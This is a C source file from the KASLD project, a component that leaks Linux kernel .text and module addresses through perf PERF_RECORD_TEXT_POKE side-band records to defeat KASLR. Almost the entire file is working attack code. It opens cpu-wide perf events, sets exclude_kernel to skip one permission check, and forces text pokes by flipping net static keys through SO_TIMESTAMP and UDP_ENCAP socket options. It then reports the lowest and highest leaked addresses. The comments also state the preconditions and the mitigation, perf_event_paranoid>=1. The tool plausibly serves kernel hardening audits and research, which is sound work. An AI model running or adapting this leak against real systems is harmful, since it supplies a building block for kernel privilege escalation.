// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Capture core-kernel .text addresses from perf side-band text-poke records.
//
// The kernel emits a PERF_RECORD_TEXT_POKE event each time it live-patches
// kernel code — static-key / jump-label toggles and alternative rewrites
// (arch/x86/kernel/alternative.c), ftrace trampoline/callsite patching
// (kernel/trace/ftrace.c), and optimized-kprobe jumps (arch/x86/kernel/
// kprobes/opt.c). Each record carries the exact patched virtual address
// (.misc = PERF_RECORD_MISC_KERNEL) plus the old and new instruction bytes.
// perf_event_text_poke_output() writes the address unmasked — no
// kallsyms_show_value / %pK gate, and it ignores attr.exclude_kernel (that
// flag suppresses sampled kernel IPs, not side-band metadata records).
//
// Unlike the other perf leaks:
//   - perf_event_open / perf_lbr_sampling sample kernel IPs/branches
//     (statistical, and LBR needs specific CPU hardware + a busy loop);
//   - perf_ksymbol_leak yields only MODULE-region addresses (BPF JIT /
//     kprobe OOL / ftrace trampolines).
//
// This component is the side-band source for CORE kernel .text: static-key
// and alternative patch sites are compiled into the kernel image, so their
// addresses bound the kernel image base (_stext) directly — no LBR silicon.
// Text pokes are infrequent on a steady-state box, so rather than wait for
// ambient patching the component FORCES it, unprivileged: toggling a refcounted
// net static key across its global 0<->1 boundary runs jump_label_update() ->
// text_poke on every static-branch site of that key -> a burst of
// PERF_RECORD_TEXT_POKE. Two independent keys are used (netstamp_needed_key via
// SO_TIMESTAMP, udp_encap_needed_key via UDP_ENCAP) so a process holding one
// does not prevent the flip. This makes it self-sufficient, unlike
// perf_ksymbol_leak (which waits for a BPF / kprobe / ftrace registration and
// yields nothing on a quiet system).
//
// Subscription is identical to perf_ksymbol_leak: a side-band perf event
// (pid=-1, cpu>=0) with attr.text_poke=1. attr.exclude_kernel=1 bypasses
// perf_allow_kernel(), but the pid=-1 (cpu-wide) path still routes through
// perf_allow_cpu(), which requires perf_event_paranoid<=0 for an unprivileged
// user (or CAP_PERFMON). Side-band events dispatch via this_cpu_ptr(
// &pmu_sb_events) in perf_iterate_sb_cpu(), so an event opened on cpu=N only
// sees pokes fired while cpu N is current — subscribe on every online CPU.
//
// A text poke can patch either core .text or a module-region trampoline, so
// each leaked address is emitted only under the region it actually falls in: a
// core-.text address as a KERNEL_TEXT interior sample (bounds the image base
// from above), a module-region address (ftrace trampoline / kprobe page) as
// REGION_MODULE_REGION; anything outside both windows is skipped.
//
// Requires:
// - kernel.perf_event_paranoid <= 0 (or CAP_PERFMON / CAP_SYS_ADMIN)
// - x86_64 in practice (the text-poke emitters are largely x86 alternative /
//   kprobe patching plus generic ftrace)
//
// Leak primitive:
//   Data leaked:      core kernel .text virtual addresses (live-patch sites)
//   Kernel subsystem: kernel/events — perf side-band PERF_RECORD_TEXT_POKE
//   Data structure:   perf_text_poke_event (addr, old_len, new_len, bytes)
//   Address type:     virtual (kernel text / module region)
//   Method:           parsed (perf record stream)
//   Status:           gated by design (perf_event_paranoid)
//   Access check:     perf_allow_cpu() requires paranoid<=0 unprivileged
//   Source: https://elixir.bootlin.com/linux/v6.12/source/kernel/events/core.c
//
// Mitigations:
//   kernel.perf_event_paranoid >= 1 blocks the pid=-1 side-band path. Bypass
//   requires CAP_PERFMON (v5.8+) or CAP_SYS_ADMIN.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <linux/perf_event.h>
#include <linux/version.h>
#include <netinet/in.h> /* IPPROTO_UDP */
#include <poll.h>
#include <stddef.h> /* offsetof */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_L2TPINUDP
#define UDP_ENCAP_L2TPINUDP 3
#endif

/* attr.text_poke (bit 33 of the flags word) was added in v5.9; some cross UAPI
 * headers predate it. Use the named bitfield where present (correct on every
 * ABI, including big-endian); otherwise set the bit at its stable position (the
 * flags __u64 immediately follows read_format). text_poke only fires on x86
 * (little-endian) in practice, so the raw-bit fallback is exercised only where
 * a differing bit layout would be inert anyway. */
static void attr_enable_text_poke(struct perf_event_attr *attr) {
#if !defined(LINUX_VERSION_CODE) ||                                            \
    LINUX_VERSION_CODE >= KERNEL_VERSION(5, 9, 0)
  attr->text_poke = 1;
#else
  unsigned char *p = (unsigned char *)attr +
                     offsetof(struct perf_event_attr, read_format) +
                     sizeof(uint64_t);
  uint64_t flags;
  memcpy(&flags, p, sizeof(flags)); /* memcpy, not an aligned u64 cast */
  flags |= (1ULL << 33);
  memcpy(p, &flags, sizeof(flags));
#endif
}

KASLD_EXPLAIN(
    "Subscribes to perf side-band PERF_RECORD_TEXT_POKE events (pid=-1, one "
    "event per online CPU, text_poke=1). Each record carries the exact core "
    "kernel .text address the kernel just live-patched (static keys, jump "
    "labels, alternatives, ftrace, kprobes), written unmasked and ignoring "
    "attr.exclude_kernel. Core-.text addresses bound the kernel image base. "
    "The component forces the patching itself (unprivileged) by flipping "
    "refcounted net static keys (SO_TIMESTAMP, UDP_ENCAP), so it is "
    "self-sufficient rather than waiting for ambient activity. Gated by "
    "kernel.perf_event_paranoid: the "
    "system-wide path needs paranoid<=0 (or CAP_PERFMON).");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "sysctl:perf_event_paranoid>=1\n"
           "bypass:CAP_PERFMON\n"
           "bypass:CAP_SYS_ADMIN\n");

/* Multi-page data ring: must be power-of-2 pages, plus the metadata page. */
#define DATA_PAGES 16

/* Polling window for records after the forced flips (and any ambient pokes). */
#define POLL_MS 2000

/* Self-trigger: up to TRIGGER_ROUNDS batches of TRIGGER_CYCLES static-key
 * flips, stopping at the first batch that yields pokes. One boundary crossing
 * already patches every static-branch site of a key, so the first batch usually
 * suffices (light patching); the extra rounds only run if a transient key
 * holder blocked the crossing. */
#define TRIGGER_CYCLES 64
#define TRIGGER_ROUNDS 8

/* Max on-stack copy for one record: header(8) + addr(8) + old_len/new_len(4) +
 * up to a few hundred old+new bytes + sample_id. 1024 covers it. */
#define MAX_RECORD 1024

#ifndef PERF_RECORD_TEXT_POKE
#define PERF_RECORD_TEXT_POKE 20
#endif

static int perf_event_open_(struct perf_event_attr *attr, pid_t pid, int cpu,
                            int group_fd, unsigned long flags) {
  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* Force a burst of text-poke events, unprivileged. Several net static keys are
 * refcounted: when the global count crosses 0<->1 the kernel runs
 * jump_label_update() -> text_poke on every static-branch site of that key,
 * each emitting a PERF_RECORD_TEXT_POKE for a core-.text address. Toggling a
 * key on then off (as the sole holder) crosses the boundary twice. This makes
 * the component self-sufficient — no ambient patching or external (root)
 * trigger, unlike perf_ksymbol_leak.
 *
 * Two INDEPENDENT keys are flipped so a holder of one does not cause total
 * failure: netstamp_needed_key (SO_TIMESTAMP — touched by network daemons, so
 * sometimes held) and udp_encap_needed_key (UDP_ENCAP — L2TP/ESP-in-UDP, almost
 * never held). If a key is already held by another process the toggle does not
 * reach 0 and no flip occurs for that key; the other key still fires. */
static void trigger_text_pokes(int cycles) {
  for (int i = 0; i < cycles; i++) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
      int on = 1, off = 0;
      setsockopt(s, SOL_SOCKET, SO_TIMESTAMP, &on, sizeof(on));
      setsockopt(s, SOL_SOCKET, SO_TIMESTAMPNS, &on, sizeof(on));
      setsockopt(s, SOL_SOCKET, SO_TIMESTAMP, &off, sizeof(off));
      setsockopt(s, SOL_SOCKET, SO_TIMESTAMPNS, &off, sizeof(off));
      close(s); /* netstamp: inc on enable (0->1), dec on close (1->0) */
    }
    int u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (u >= 0) {
      int enc = UDP_ENCAP_L2TPINUDP;
      setsockopt(u, IPPROTO_UDP, UDP_ENCAP, &enc, sizeof(enc)); /* inc (0->1) */
      close(u); /* udp_destroy_sock dec (1->0) */
    }
  }
}

/* PERF_RECORD_TEXT_POKE wire layout (after the 8-byte perf_event_header):
 *   u64 addr        <- the patched .text address (the only field used)
 *   u16 old_len
 *   u16 new_len
 *   u8  bytes[old_len + new_len]
 *   ... padding + sample_id
 * See kernel/events/core.c:perf_event_text_poke_output. */

static void ring_copy(const char *ring, size_t ring_size, uint64_t off,
                      void *dst, size_t n) {
  size_t off_in = (size_t)(off % ring_size);
  size_t first = ring_size - off_in;
  if (first >= n) {
    memcpy(dst, ring + off_in, n);
  } else {
    memcpy(dst, ring + off_in, first);
    memcpy((char *)dst + first, ring, n - first);
  }
}

/* Per-region extremes across all rings. Each poked address is an interior
 * point of its region, so the LOWEST bounds the region base from above (the
 * tightest ceiling — for .text, the closest approach to _stext) and the HIGHEST
 * is a floor witness. Collect all, emit only the extremes (mirrors the
 * alsa_seq_ext_ptr min/max emission) rather than one line per poke. */
struct tp_acc {
  unsigned long text_lo, text_hi;
  unsigned long mod_lo, mod_hi;
  int text_n, mod_n;
};

/* Drain one ring; classify each poked address by region and fold it into the
 * accumulator's per-region min/max. */
static void drain_ring(struct perf_event_mmap_page *meta, const char *ring,
                       size_t ring_size, struct tp_acc *acc) {
  uint64_t head = *(volatile __u64 *)&meta->data_head;
  __atomic_thread_fence(__ATOMIC_ACQUIRE);
  uint64_t tail = meta->data_tail;

  while (tail < head) {
    struct perf_event_header header;
    if (head - tail < sizeof(header))
      break;
    ring_copy(ring, ring_size, tail, &header, sizeof(header));
    if (header.size < sizeof(header) || header.size > MAX_RECORD)
      break;
    if (head - tail < header.size)
      break;

    if (header.type == PERF_RECORD_TEXT_POKE &&
        header.size >= sizeof(header) + sizeof(uint64_t)) {
      char buf[MAX_RECORD];
      ring_copy(ring, ring_size, tail, buf, header.size);
      uint64_t addr64;
      memcpy(&addr64, buf + sizeof(header), sizeof(addr64));
      unsigned long addr = (unsigned long)addr64;

      if (addr != 0 && kasld_addr_is_kernel_text(addr)) {
        if (acc->text_n == 0 || addr < acc->text_lo)
          acc->text_lo = addr;
        if (acc->text_n == 0 || addr > acc->text_hi)
          acc->text_hi = addr;
        acc->text_n++;
      } else if (addr != 0 && kasld_addr_is_module_region(addr)) {
        if (acc->mod_n == 0 || addr < acc->mod_lo)
          acc->mod_lo = addr;
        if (acc->mod_n == 0 || addr > acc->mod_hi)
          acc->mod_hi = addr;
        acc->mod_n++;
      }
      /* addresses outside both windows are skipped (not mislabelled) */
    }

    tail += header.size;
  }

  __atomic_thread_fence(__ATOMIC_RELEASE);
  *(volatile __u64 *)&meta->data_tail = tail;
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  if (kasld_skip_live_probe("perf text_poke"))
    return 0;
  int poll_ms = POLL_MS;
  if (kasld_time_s > 0)
    poll_ms = (kasld_time_s > 600) ? 600000 : (int)(kasld_time_s * 1000);

  long page_size = sysconf(_SC_PAGESIZE);
  if (page_size <= 0)
    return KASLD_EXIT_UNAVAILABLE;
  size_t ring_size = (size_t)page_size * DATA_PAGES;
  size_t map_size = (size_t)page_size + ring_size;

  long ncpus_l = sysconf(_SC_NPROCESSORS_ONLN);
  if (ncpus_l <= 0)
    return KASLD_EXIT_UNAVAILABLE;
  int ncpus = (int)ncpus_l;

  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_DUMMY;
  attr.size = sizeof(attr);
  attr.sample_period = 0;
  attr.disabled = 0;
  attr.exclude_kernel = 1; /* bypass perf_allow_kernel() paranoid<=1 check */
  attr_enable_text_poke(&attr);
  attr.wakeup_events = 1; /* wake poll() on every record */

  int *fds = calloc((size_t)ncpus, sizeof(*fds));
  void **maps = calloc((size_t)ncpus, sizeof(*maps));
  struct pollfd *pfds = calloc((size_t)ncpus, sizeof(*pfds));
  if (!fds || !maps || !pfds) {
    free(fds);
    free(maps);
    free(pfds);
    return KASLD_EXIT_UNAVAILABLE;
  }
  for (int i = 0; i < ncpus; i++)
    fds[i] = -1;

  int opened = 0;
  int first_err = 0;
  for (int cpu = 0; cpu < ncpus; cpu++) {
    int fd = perf_event_open_(&attr, -1, cpu, -1, 0);
    if (fd < 0) {
      if (!first_err)
        first_err = errno;
      continue;
    }
    void *base =
        mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (base == MAP_FAILED) {
      close(fd);
      continue;
    }
    fds[cpu] = fd;
    maps[cpu] = base;
    pfds[opened].fd = fd;
    pfds[opened].events = POLLIN;
    opened++;
  }

  if (opened == 0) {
    int rc = (first_err == EACCES || first_err == EPERM)
                 ? KASLD_EXIT_NOPERM
                 : KASLD_EXIT_UNAVAILABLE;
    if (first_err == EACCES || first_err == EPERM)
      kasld_err("perf_event_open EACCES — perf_event_paranoid > 0");
    else
      kasld_err("perf_event_open failed on every cpu: %s", strerror(first_err));
    free(fds);
    free(maps);
    free(pfds);
    return rc;
  }

  kasld_info("subscribed to PERF_RECORD_TEXT_POKE on %d cpu(s); forcing "
             "static-key flips ...",
             opened);

  /* Adaptive self-trigger: flip the static key in small batches and drain after
   * each, stopping as soon as pokes arrive. On a clear system the first batch
   * suffices (minimal patching); if a transient key holder blocked the
   * 0<->1 crossing this round, retry. */
  struct tp_acc acc;
  memset(&acc, 0, sizeof(acc));
  int round_ms = poll_ms / TRIGGER_ROUNDS;
  if (round_ms < 100)
    round_ms = 100;
  for (int round = 0; round < TRIGGER_ROUNDS; round++) {
    trigger_text_pokes(TRIGGER_CYCLES);
    poll(pfds, (nfds_t)opened, round_ms);
    for (int cpu = 0; cpu < ncpus; cpu++) {
      if (fds[cpu] < 0)
        continue;
      struct perf_event_mmap_page *meta = maps[cpu];
      const char *ring = (const char *)maps[cpu] + page_size;
      drain_ring(meta, ring, ring_size, &acc);
    }
    if (acc.text_n || acc.mod_n)
      break;
  }

  for (int cpu = 0; cpu < ncpus; cpu++) {
    if (fds[cpu] < 0)
      continue;
    munmap(maps[cpu], map_size);
    close(fds[cpu]);
  }

  free(fds);
  free(maps);
  free(pfds);

  if (acc.text_n == 0 && acc.mod_n == 0) {
    kasld_err("no text_poke events arrived in the polling window");
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* Core .text: lowest = tightest image-base ceiling, highest = floor witness.
   */
  if (acc.text_n) {
    kasld_found("%d core .text poke(s); lowest 0x%lx highest 0x%lx", acc.text_n,
                acc.text_lo, acc.text_hi);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, acc.text_lo, NULL,
                        CONF_PARSED);
    if (acc.text_hi != acc.text_lo)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, acc.text_hi,
                          NULL, CONF_PARSED);
  }
  /* Module-region pokes (ftrace trampoline / kprobe page), if any. */
  if (acc.mod_n) {
    kasld_found("%d module-region poke(s); lowest 0x%lx highest 0x%lx",
                acc.mod_n, acc.mod_lo, acc.mod_hi);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_REGION, acc.mod_lo, NULL,
                        CONF_PARSED);
    if (acc.mod_hi != acc.mod_lo)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_REGION, acc.mod_hi,
                          NULL, CONF_PARSED);
  }
  return 0;
}
